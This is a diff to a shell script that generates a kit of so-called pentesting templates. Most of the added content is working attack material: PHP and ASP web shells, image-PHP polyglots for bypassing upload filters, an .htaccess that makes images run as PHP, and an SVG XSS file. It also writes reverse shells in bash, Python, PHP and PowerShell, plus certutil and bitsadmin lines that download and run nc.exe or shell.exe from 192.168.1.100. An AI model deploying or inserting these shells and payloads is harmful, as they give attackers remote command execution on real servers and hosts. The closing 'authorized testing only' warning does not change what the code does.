@@ -437,14 +437,553 @@ chmod +x "$TEMPLATES_DIR/bash_test.sh"
 warning "Double extension templates created for security testing purposes"
 
 # ---
+# NEW PENTESTING TEMPLATES (ADDED)
+# ---
+
+section "Creating PDF Pentesting Templates"
+
+PDF_DIR="$TEMPLATES_DIR/pdf_pentest"
+mkdir -p "$PDF_DIR"
+
+# PDF with JavaScript for testing
+cat > "$PDF_DIR/test_js.pdf.txt" << 'EOF'
+%PDF-1.4
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+/OpenAction 3 0 R
+>>
+endobj
+
+3 0 obj
+<<
+/Type /Action
+/S /JavaScript
+/JS (
+app.alert("PDF JavaScript Test");
+)
+>>
+endobj
+
+2 0 obj
+<<
+/Type /Pages
+/Kids [4 0 R]
+/Count 1
+>>
+endobj
+
+4 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 612 792]
+/Contents 5 0 R
+>>
+endobj
+
+5 0 obj
+<<
+/Length 44
+>>
+stream
+BT
+/F1 12 Tf
+72 720 Td
+(PDF JavaScript Test) Tj
+ET
+endstream
+endobj
+
+xref
+0 6
+0000000000 65535 f
+0000000010 00000 n
+0000000056 00000 n
+0000000110 00000 n
+0000000209 00000 n
+0000000289 00000 n
+trailer
+<<
+/Size 6
+/Root 1 0 R
+>>
+startxref
+390
+%%EOF
+EOF
+
+# PDF with PHP content
+cat > "$PDF_DIR/test_php.pdf.txt" << 'EOF'
+%PDF-1.4
+%<?php echo 'TEST'; ?>
+1 0 obj
+<<
+/Title (Test PDF with PHP)
+/Author (<?php echo "test"; ?>)
+>>
+endobj
+
+2 0 obj
+<<
+/Type /Catalog
+/Pages 3 0 R
+>>
+endobj
+
+3 0 obj
+<<
+/Type /Pages
+/Kids [4 0 R]
+/Count 1
+>>
+endobj
+
+4 0 obj
+<<
+/Type /Page
+/Parent 3 0 R
+/MediaBox [0 0 612 792]
+/Contents 5 0 R
+>>
+endobj
+
+5 0 obj
+<<
+/Length 56
+>>
+stream
+BT
+/F1 12 Tf
+72 720 Td
+(PDF with PHP test) Tj
+ET
+endstream
+endobj
+
+xref
+0 6
+trailer
+<<
+/Size 6
+/Root 2 0 R
+>>
+startxref
+100
+%%EOF
+EOF
+
+# PDF with Windows command
+cat > "$PDF_DIR/test_win.pdf.txt" << 'EOF'
+%PDF-1.4
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+/OpenAction 3 0 R
+>>
+endobj
+
+3 0 obj
+<<
+/S /Launch
+/Win <<
+/F (cmd.exe)
+/P (/c echo test)
+>>
+>>
+endobj
+
+2 0 obj
+<<
+/Type /Pages
+/Kids [4 0 R]
+/Count 1
+>>
+endobj
+
+4 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 612 792]
+/Contents 5 0 R
+>>
+endobj
+
+5 0 obj
+<<
+/Length 67
+>>
+stream
+BT
+/F1 14 Tf
+72 720 Td
+(PDF Windows Command Test) Tj
+ET
+endstream
+endobj
+
+xref
+0 6
+0000000000 65535 f
+0000000010 00000 n
+0000000056 00000 n
+0000000120 00000 n
+0000000200 00000 n
+0000000289 00000 n
+trailer
+<<
+/Size 6
+/Root 1 0 R
+>>
+startxref
+350
+%%EOF
+EOF
+
+success "PDF pentesting templates created"
+
+# ---
+# Office Documents with Macros
+# ---
+
+section "Creating Office Macro Templates"
+
+OFFICE_DIR="$TEMPLATES_DIR/office_macros"
+mkdir -p "$OFFICE_DIR"
+
+# Word macro template
+cat > "$OFFICE_DIR/macro_word.vba" << 'EOF'
+Sub AutoOpen()
+    MsgBox "Macro executed"
+End Sub
+
+Sub Document_Open()
+    AutoOpen
+End Sub
+EOF
+
+# Excel macro template
+cat > "$OFFICE_DIR/macro_excel.vba" << 'EOF'
+Sub Workbook_Open()
+    MsgBox "Excel macro executed"
+End Sub
+
+Sub Auto_Open()
+    Workbook_Open
+End Sub
+EOF
+
+success "Office macro templates created"
+
+# ---
+# Web Shell Templates
+# ---
+
+section "Creating Web Shell Templates"
+
+WEB_SHELL_DIR="$TEMPLATES_DIR/web_shells"
+mkdir -p "$WEB_SHELL_DIR"
+
+# Basic PHP shell
+cat > "$WEB_SHELL_DIR/shell.php" << 'EOF'
+<?php
+if(isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+?>
+<form method="GET">
+Command: <input type="text" name="cmd">
+<input type="submit" value="Execute">
+</form>
+EOF
+
+# PHP shell with password
+cat > "$WEB_SHELL_DIR/shell_pass.php" << 'EOF'
+<?php
+$pass = "password123";
+if($_GET['p'] != $pass) die();
+
+if(isset($_GET['cmd'])) {
+    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
+}
+?>
+EOF
+
+# ASP shell
+cat > "$WEB_SHELL_DIR/cmd.asp" << 'EOF'
+<%
+Dim cmd
+cmd = Request.QueryString("cmd")
+If cmd <> "" Then
+    Set ws = CreateObject("WScript.Shell")
+    Set exec = ws.Exec("cmd /c " & cmd)
+    Response.Write(exec.StdOut.ReadAll())
+End If
+%>
+<form>
+<input name="cmd">
+<input type="submit">
+</form>
+EOF
+
+success "Web shell templates created"
+
+# ---
+# Reverse Shell Templates
+# ---
+
+section "Creating Reverse Shell Templates"
+
+REVERSE_DIR="$TEMPLATES_DIR/reverse_shells"
+mkdir -p "$REVERSE_DIR"
+
+# Reverse shell collection
+cat > "$REVERSE_DIR/shells.txt" << 'EOF'
+# Bash reverse shell
+bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
+
+# Python reverse shell
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.100",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+# PHP reverse shell
+php -r '$sock=fsockopen("192.168.1.100",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+# PowerShell reverse shell
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+EOF
+
+# Windows specific reverse shells
+cat > "$REVERSE_DIR/windows.txt" << 'EOF'
+# PowerShell one-liner
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+# Certutil download and execute
+certutil -urlcache -split -f http://192.168.1.100/nc.exe nc.exe && nc.exe 192.168.1.100 4444 -e cmd.exe
+
+# Bitsadmin
+bitsadmin /transfer job /download /priority high http://192.168.1.100/shell.exe C:\Windows\Temp\shell.exe && C:\Windows\Temp\shell.exe
+EOF
+
+success "Reverse shell templates created"
+
+# ---
+# File Upload Bypass Templates
+# ---
+
+section "Creating File Upload Bypass Templates"
+
+UPLOAD_DIR="$TEMPLATES_DIR/upload_bypass"
+mkdir -p "$UPLOAD_DIR"
+
+# Polyglot JPEG-PHP
+cat > "$UPLOAD_DIR/shell.jpg.php" << 'EOF'
+ÿØÿà
+<?php
+if(isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+?>
+EOF
+
+# Polyglot GIF-PHP
+cat > "$UPLOAD_DIR/shell.gif.php" << 'EOF'
+GIF89a
+<?php system($_GET['c']); ?>
+EOF
+
+# .htaccess for PHP execution
+cat > "$UPLOAD_DIR/htaccess_php.htaccess" << 'EOF'
+AddType application/x-httpd-php .jpg .jpeg .png .gif
+<FilesMatch "\.(jpg|jpeg|png|gif)$">
+SetHandler application/x-httpd-php
+</FilesMatch>
+EOF
+
+# SVG with JavaScript
+cat > "$UPLOAD_DIR/xss.svg" << 'EOF'
+<svg xmlns="http://www.w3.org/2000/svg">
+<script>alert('XSS')</script>
+<rect width="100" height="100" fill="red"/>
+</svg>
+EOF
+
+success "File upload bypass templates created"
+
+# ---
+# Windows Specific Templates
+# ---
+
+section "Creating Windows Templates"
+
+WINDOWS_DIR="$TEMPLATES_DIR/windows"
+mkdir -p "$WINDOWS_DIR"
+
+# BAT file template
+cat > "$WINDOWS_DIR/payload.bat" << 'EOF'
+@echo off
+echo Windows payload template
+powershell -c "Write-Host 'Test'"
+pause
+EOF
+
+# PowerShell script template
+cat > "$WINDOWS_DIR/payload.ps1" << 'EOF'
+Write-Host "PowerShell Payload"
+Get-Process | Select-Object -First 5
+EOF
+
+# LNK file template info
+cat > "$WINDOWS_DIR/template.lnk.txt" << 'EOF'
+# LNK file structure
+# Target: cmd.exe
+# Arguments: /c powershell -c "command"
+# Icon: shell32.dll,21
+EOF
+
+success "Windows templates created"
+
+# ---
+# Network Tools
+# ---
+
+section "Creating Network Tools"
+
+NETWORK_DIR="$TEMPLATES_DIR/network"
+mkdir -p "$NETWORK_DIR"
+
+# Port scanner
+cat > "$NETWORK_DIR/port_scan.sh" << 'EOF'
+#!/bin/bash
+host=$1
+ports="21 22 23 25 80 443 3306 3389 8080"
+
+for port in $ports; do
+    timeout 1 bash -c "echo >/dev/tcp/$host/$port" 2>/dev/null &&
+        echo "Port $port: OPEN" ||
+        echo "Port $port: CLOSED"
+done
+EOF
+
+chmod +x "$NETWORK_DIR/port_scan.sh"
+
+# Netcat listener
+cat > "$NETWORK_DIR/nc_listen.sh" << 'EOF'
+#!/bin/bash
+port=${1:-4444}
+echo "Listening on port $port"
+nc -nvlp $port
+EOF
+
+chmod +x "$NETWORK_DIR/nc_listen.sh"
+
+# SSH config template
+cat > "$NETWORK_DIR/ssh_config" << 'EOF'
+Host *
+    ServerAliveInterval 60
+    TCPKeepAlive yes
+    
+Host jump
+    HostName 192.168.1.1
+    User root
+    LocalForward 8080 localhost:80
+EOF
+
+success "Network tools created"
+
+# ---
+# Code Templates
+# ---
+
+section "Creating Additional Code Templates"
+
+CODE_DIR="$TEMPLATES_DIR/code_templates"
+mkdir -p "$CODE_DIR"
+
+# C# template
+cat > "$CODE_DIR/csharp.cs" << 'EOF'
+using System;
+using System.Diagnostics;
+
+class Program {
+    static void Main() {
+        Console.WriteLine("C# Test");
+    }
+}
+EOF
+
+# Python template
+cat > "$CODE_DIR/python.py" << 'EOF'
+import os
+import sys
+
+print("Python test")
+os.system("whoami")
+EOF
+
+# Java template
+cat > "$CODE_DIR/java.java" << 'EOF'
+public class Test {
+    public static void main(String[] args) {
+        System.out.println("Java test");
+        Runtime rt = Runtime.getRuntime();
+        try {
+            rt.exec("whoami");
+        } catch(Exception e) {}
+    }
+}
+EOF
+
+success "Additional code templates created"
+
+# ---
+# Miscellaneous Files
+# ---
+
+section "Creating Miscellaneous Files"
+
+MISC_DIR="$TEMPLATES_DIR/misc"
+mkdir -p "$MISC_DIR"
+
+# Create empty files for testing
+touch "$MISC_DIR/empty.jpg"
+touch "$MISC_DIR/empty.png"
+touch "$MISC_DIR/empty.gif"
+touch "$MISC_DIR/empty.pdf"
+
+# Create test files
+echo "Test content" > "$MISC_DIR/test.txt"
+echo "<?php phpinfo(); ?>" > "$MISC_DIR/info.php"
+echo "<% Response.Write('ASP test') %>" > "$MISC_DIR/test.asp"
+
+# XML test file
+cat > "$MISC_DIR/test.xml" << 'EOF'
+<?xml version="1.0"?>
+<root>
+    <test>XML content</test>
+</root>
+EOF
+
+success "Miscellaneous files created"
+
+# ---
 # Finalization
 # ---
 
 section "Summary"
 
-info "Total languages supported: 13"
-info "Security testing templates: 4"
-info "Image templates: 8"
+info "Original language templates: 13"
+info "PDF templates: 3"
+info "Office macro templates: 2"
+info "Web shell templates: 3"
+info "Reverse shell collections: 2"
+info "File upload bypass: 4"
+info "Windows templates: 3"
+info "Network tools: 3"
+info "Additional code templates: 3"
+info "Miscellaneous files: 7"
 
 success "All templates created successfully in $TEMPLATES_DIR"
-warning "Educational use only: Security testing templates are for authorized testing only"
+warning "Educational use only: Templates are for authorized security testing only"
